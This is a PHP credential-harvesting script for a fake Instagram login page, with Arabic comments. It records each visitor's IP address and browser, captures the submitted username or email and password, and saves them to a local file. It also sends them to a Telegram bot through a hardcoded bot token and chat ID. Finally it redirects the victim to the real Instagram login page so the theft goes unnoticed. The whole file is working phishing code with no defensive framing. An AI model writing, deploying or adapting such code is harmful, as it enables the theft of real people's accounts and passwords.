
<?php
// إعدادات Telegram
$botToken = '5984403789:AAG0N8ThL71h4mIxPuIb4F863OyZurWBM8A';
$chatId = '5322402925';

// تضمين معالج Telegram
require_once('../../telegram_handler.php');

// حفظ IP للزوار
$ip = $_SERVER['REMOTE_ADDR'] ?? 'غير معروف';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'غير معروف';
$timestamp = date('Y-m-d H:i:s');

// كتابة IP في ملف
file_put_contents('ip.txt', "IP: $ip | User-Agent: $userAgent | Time: $timestamp\n", FILE_APPEND | LOCK_EX);

// معالجة بيانات تسجيل الدخول
if ($_SERVER["REQUEST_METHOD"] == "POST" && !empty($_POST)) {
    $username = $_POST['username'] ?? $_POST['email'] ?? 'غير متاح';
    $password = $_POST['password'] ?? 'غير متاح';

    // التأكد من وجود بيانات صحيحة
    if ($username !== 'غير متاح' && $password !== 'غير متاح' && 
        !empty(trim($username)) && !empty(trim($password))) {
        
        // حفظ في ملف محلي
        $data = "=== بيانات جديدة ===\n";
        $data .= "Username: " . trim($username) . "\n";
        $data .= "Password: " . trim($password) . "\n";
        $data .= "IP: $ip\n";
        $data .= "User-Agent: $userAgent\n";
        $data .= "Time: $timestamp\n";
        $data .= "========================\n\n";
        
        file_put_contents('usernames.txt', $data, FILE_APPEND | LOCK_EX);

        // إرسال إلى Telegram
        try {
            logCredentials('Instagram', trim($username), trim($password), $ip, $botToken, $chatId);
        } catch (Exception $e) {
            // حفظ الخطأ في ملف
            file_put_contents('errors.txt', "Telegram Error: " . $e->getMessage() . " | Time: $timestamp\n", FILE_APPEND | LOCK_EX);
        }
    }

    // إعادة توجيه للصفحة الرئيسية لInstagram
    header('Location: https://www.instagram.com/accounts/login/');
    exit();
}

// إذا لم تكن POST request، إعادة توجيه لصفحة تسجيل الدخول
header('Location: login.html');
exit();
?>
